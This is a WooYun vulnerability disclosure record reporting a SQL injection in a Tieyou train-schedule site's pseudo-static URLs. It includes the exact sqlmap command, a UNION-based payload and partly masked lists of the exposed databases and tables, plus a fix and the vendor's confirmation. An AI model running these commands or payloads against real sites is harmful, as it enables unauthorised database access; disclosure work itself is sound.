{"id": 5176, "wybug_id": "wooyun-2014-050909", "wybug_title": "铁友网某站SQL注射可致所有数据库信息泄露", "wybug_corp": "铁友网", "wybug_author": "lxj616", "wybug_date": "2014-02-14 12:06", "wybug_open_date": "2014-03-31 12:07", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "16", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-02-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-02-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-02-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-03-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-03-31：\t细节向公众公开  简要描述： 铁友网某站SQL注射 可致所有数据库信息泄露使用SQLMAP跑表足够证明其危害，不继续深入 详细说明：  漏洞位置为\nhttp://checi.tieyou.com/2251/2253/2257.html\n由于其对于伪静态的处理存在缺陷，导致在解析uri中间的数字时引发注射比如：\nhttp://checi.tieyou.com/2251/2253/【注射语句】/2257.html\n用SQLMAP 跑表注：中间的星号是SQLMAP手动标注注射点的记号\nC:\\Users\\Administrator>sqlmap.py -u \"http://checi.tieyou.com/2251/2253/*/2257.html\" --tables\n\nsqlmap identified the following injection points with a total of 122 HTTP(s) requests:---Place: URIParameter: #1*    Type: UNION query    Title: MySQL UNION query (NULL) - 10 columns    Payload: http://checi.tieyou.com:80/2251/2253/' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7179667571,0x69524558475976445374,0x71696d6f71),NULL,NULL,NULL,NULL,NULL,NULL#/2257.html---web application technology: Apache 2.2.15back-end DBMS: MySQL >= 5.0.0sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: URIParameter: #1*    Type: UNION query    Title: MySQL UNION query (NULL) - 10 columns    Payload: http://checi.tieyou.com:80/2251/2253/' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7179667571,0x69524558475976445374,0x71696d6f71),NULL,NULL,NULL,NULL,NULL,NULL#/2257.html---web application technology: Apache 2.2.15back-end DBMS: MySQL 5Database: league[1 table]+----------------------------------------------+| tbl_Franchisee                               |+----------------------------------------------+Database: hotel[40 tables]+----------------------------------------------+| \n\nmask 区域\n\n*****           **********            **********            **********            **********tity        **********            **********            **********            **********            **********            **********l           **********            **********            **********            **********etail       **********            **********price       **********y           **********y_12        **********ee          **********            **********            **********icelist     **********            **********foentity    **********            **********            **********rate        **********e           **********dings       **********task        **********            **********            **********            **********            **********            **********            **********            **********og          **********            *****\n\n\n\n+----------------------------------------------+Database: flight[5 tables]+----------------------------------------------+| \n\n\n\nmask 区域\n\n*****           **********            **********            **********            **********u_to_c*****\n\n\n\n                     |+----------------------------------------------+Database: log[6 tables]+----------------------------------------------+| log                                          || \n\n\n\nmask 区域\n\n*****           **********            **********            **********            **********ser_*****\n\n\n\n                                 |+----------------------------------------------+Database: performance_schema[17 tables]+----------------------------------------------+| \n\n\n\nmask 区域\n\n*****           **********            **********            **********long        **********by_instance **********by_thread_by**********global_by_ev**********            **********_name       **********nce         **********            **********            **********            **********            **********            **********            **********ead*****\n\n\n\n                                   |+----------------------------------------------+Database: mysql[24 tables]+----------------------------------------------+| \n\n\n\nmask 区域\n\n*****           **********            **********            **********            **********            **********            **********            **********            **********            **********            **********            **********            **********            **********            **********            **********            **********            **********            **********            **********            **********            **********            **********            **********type        *****\n\n\n\n+----------------------------------------------+Database: address[2 tables]+----------------------------------------------+| tbl_area                                     || tbl_area_new                                 |+----------------------------------------------+Database: analysis[5 tables]+----------------------------------------------+| \n\n\n\nmask 区域\n\n*****           **********            **********            **********            **********_route*****\n\n\n\n                     |+----------------------------------------------+Database: lianmeng[9 tables]+----------------------------------------------+| cronjoblogs                                  || lm_admins                                    || lm_commissions                               || lm_members                                   || lm_orders                                    || lm_pic_ads                                   || lm_profits                                   || lm_tixiansqs                                 || lm_users                                     |+----------------------------------------------+Database: configdb[15 tables]+----------------------------------------------+| \n\n\n\nmask 区域\n\n*****           **********            **********            **********            **********            **********            **********            **********            **********            **********            **********            **********            **********            **********            **********info*****\n\n\n\n                              |+----------------------------------------------+Database: cacheMem[5 tables]+----------------------------------------------+| \n\n\n\nmask 区域\n\n*****           **********            **********            **********            **********che*****\n\n\n\n4                                 |+----------------------------------------------+Database: clubCtrl[21 tables]+----------------------------------------------+| \n\n\n\nmask 区域\n\n*****           **********            **********og          **********            **********            **********u           **********c           **********            **********            **********            **********            **********            **********            **********            **********            **********            **********            **********            **********            **********            **********_addp*****\n\n\n\n                            |+----------------------------------------------+Database: distributor[6 tables]+----------------------------------------------+| \n\n\n\nmask 区域\n\n*****           **********            **********er          **********er_area     **********er_dateline **********utor_li*****\n\n\n\n                   |+----------------------------------------------+Database: news[8 tables]+----------------------------------------------+| \n\n\n\nmask 区域\n\n*****           **********            **********            **********            **********            **********            **********            **********            *****\n\n\n\n+----------------------------------------------+\n还有好多数据库，足矣证明其危害，不再继续演示危害   漏洞证明：  用SQLMAP 跑表注：中间的星号是SQLMAP手动标注注射点的记号\nC:\\Users\\Administrator>sqlmap.py -u \"http://checi.tieyou.com/2251/2253/*/2257.html\" --tables\n\nsqlmap identified the following injection points with a total of 122 HTTP(s) requests:---Place: URIParameter: #1*    Type: UNION query    Title: MySQL UNION query (NULL) - 10 columns    Payload: http://checi.tieyou.com:80/2251/2253/' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7179667571,0x69524558475976445374,0x71696d6f71),NULL,NULL,NULL,NULL,NULL,NULL#/2257.html---web application technology: Apache 2.2.15back-end DBMS: MySQL >= 5.0.0sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: URIParameter: #1*    Type: UNION query    Title: MySQL UNION query (NULL) - 10 columns    Payload: http://checi.tieyou.com:80/2251/2253/' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7179667571,0x69524558475976445374,0x71696d6f71),NULL,NULL,NULL,NULL,NULL,NULL#/2257.html---web application technology: Apache 2.2.15back-end DBMS: MySQL 5Database: league[1 table]+----------------------------------------------+| tbl_Franchisee                               |+----------------------------------------------+Database: hotel[40 tables]+----------------------------------------------+| \n\nmask 区域\n\n*****           **********            **********            **********            **********tity        **********            **********            **********            **********            **********            **********l           **********            **********            **********            **********etail       **********            **********price       **********y           **********y_12        **********ee          **********            **********            **********icelist     **********            **********foentity    **********            **********            **********rate        **********e           **********dings       **********task        **********            **********            **********            **********            **********            **********            **********            **********og          **********            *****\n\n\n\n+----------------------------------------------+Database: flight[5 tables]+----------------------------------------------+| \n\n\n\nmask 区域\n\n*****           **********            **********            **********            **********u_to_c*****\n\n\n\n                     |+----------------------------------------------+Database: log[6 tables]+----------------------------------------------+| log                                          || \n\n\n\nmask 区域\n\n*****           **********            **********            **********            **********ser_*****\n\n\n\n                                 |+----------------------------------------------+Database: performance_schema[17 tables]+----------------------------------------------+| \n\n\n\nmask 区域\n\n*****           **********            **********            **********long        **********by_instance **********by_thread_by**********global_by_ev**********            **********_name       **********nce         **********            **********            **********            **********            **********            **********            **********ead*****\n\n\n\n                                   |+----------------------------------------------+Database: mysql[24 tables]+----------------------------------------------+| \n\n\n\nmask 区域\n\n*****           **********            **********            **********            **********            **********            **********            **********            **********            **********            **********            **********            **********            **********            **********            **********            **********            **********            **********            **********            **********            **********            **********            **********type        *****\n\n\n\n+----------------------------------------------+Database: address[2 tables]+----------------------------------------------+| tbl_area                                     || tbl_area_new                                 |+----------------------------------------------+Database: analysis[5 tables]+----------------------------------------------+| \n\n\n\nmask 区域\n\n*****           **********            **********            **********            **********_route*****\n\n\n\n                     |+----------------------------------------------+Database: lianmeng[9 tables]+----------------------------------------------+| cronjoblogs                                  || lm_admins                                    || lm_commissions                               || lm_members                                   || lm_orders                                    || lm_pic_ads                                   || lm_profits                                   || lm_tixiansqs                                 || lm_users                                     |+----------------------------------------------+Database: configdb[15 tables]+----------------------------------------------+| \n\n\n\nmask 区域\n\n*****           **********            **********            **********            **********            **********            **********            **********            **********            **********            **********            **********            **********            **********            **********info*****\n\n\n\n                              |+----------------------------------------------+Database: cacheMem[5 tables]+----------------------------------------------+| \n\n\n\nmask 区域\n\n*****           **********            **********            **********            **********che*****\n\n\n\n4                                 |+----------------------------------------------+Database: clubCtrl[21 tables]+----------------------------------------------+| \n\n\n\nmask 区域\n\n*****           **********            **********og          **********            **********            **********u           **********c           **********            **********            **********            **********            **********            **********            **********            **********            **********            **********            **********            **********            **********            **********_addp*****\n\n\n\n                            |+----------------------------------------------+Database: distributor[6 tables]+----------------------------------------------+| \n\n\n\nmask 区域\n\n*****           **********            **********er          **********er_area     **********er_dateline **********utor_li*****\n\n\n\n                   |+----------------------------------------------+Database: news[8 tables]+----------------------------------------------+| \n\n\n\nmask 区域\n\n*****           **********            **********            **********            **********            **********            **********            **********            *****\n\n\n\n+----------------------------------------------+\n还有好多数据库，足矣证明其危害，不再继续演示危害   修复方案：  做好所有uri中的过滤，无论是否使用了伪静态   版权声明：转载请注明来源 lxj616@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2014-02-14 16:59 厂商回复： 感谢lxj616对携程安全的支持。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-04 07:40 |    \t\t好基友一辈子 \t\t\t( 普通白帽子  |\t\t\t        Rank:138 漏洞数:37        )\t\t \n  你是怎么挖出来这个注入的    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}